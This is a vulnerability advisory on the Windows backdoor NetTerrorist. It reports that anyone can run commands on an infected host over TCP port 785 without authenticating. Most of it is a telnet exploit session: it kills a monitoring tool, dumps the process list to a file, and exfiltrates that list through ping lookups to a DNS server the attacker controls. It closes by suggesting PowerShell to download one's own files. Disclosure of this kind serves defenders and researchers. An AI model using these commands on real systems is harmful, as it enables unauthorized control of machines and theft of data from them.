Threat: Backdoor.Win32.NetTerrorist
Vulnerability: Unauthorized Remote Command Execution
Description: NetTerrorist listens on TCP port 785, it seemingly uses
authentication like USER [user], PASS [pass]. Interestingly, you can
just bypass authentication and run commands while ignoring any error
messages. If you wish to logon the main account is "root" with
password "root" which is easily guessed. Whether logged on correctly
or not, when issuing commands you get errors like "JAJAAJJ 500 'EXEC'
command not understood". Just ignore these messages as we can execute
all types of commands on the infected system.
Type: PE32
MD5: 5131a9b441c9f9b20228f171c327a4f5
Vuln ID: MVID-2021-0081
Dropped files: Systray.exe

Exploit/PoC:
TELNET [Infected_Host_IP] 785

PhuCk y0u
USER root
JAJAAJJ
331 Password required for root.
PASS abc123
JAJAAJJ
530 Login incorrect.

exec cmd /k ping 8.8.8.8
JAJAAJJ
500 'EXEC': command not understood.
exec calc
JAJAAJJ
500 'EXEC': command not understood.
exec cmd /k dir
JAJAAJJ
500 'EXEC': command not understood.
exec cmd /k taskkill /im ProcessHacker.exe
JAJAAJJ
500 'EXEC': command not understood.

Execute tasklist command and write to file.

500 'EXEC': command not understood.
exec cmd /k tasklist > c:\out.txt

Grab the results using ping (OR finger.exe to DarkFinger.py C2) to
ICMP exfil tunnel to a DNS server we control.
500 'EXEC': command not understood.
exec cmd /k for /f "delims=*" %a in (c:\1.txt) do ping -n 1 %a
JAJAAJJ
500 'EXEC': command not understood.

On our DNS server we see:

msdtc.exe. -> 192.168.1.10
ShellExperienceHost.exe. -> 192.168.1.10
SearchUI.exe. -> 192.168.1.10
RuntimeBroker.exe. -> 192.168.1.10
SearchIndexer.exe. -> 192.168.1.10
vm3dservice.exe. -> 192.168.1.10
cmd.exe. -> 192.168.1.10
conhost.exe. -> 192.168.1.10
ApplicationFrameHost.exe. -> 192.168.1.10
Backdoor.Win32.NetTerrori. -> 192.168.1.10
tasklist.exe. -> 192.168.1.10

Issue taskkill to terminate the backdoor if you got the PID:

PhuCk y0u
exec cmd /c taskkill /f /pid 392
JAJAAJJ
500 'EXEC' command not understood.

Connection to host lost.

You can also try to execute PowerShell to download your own filez.
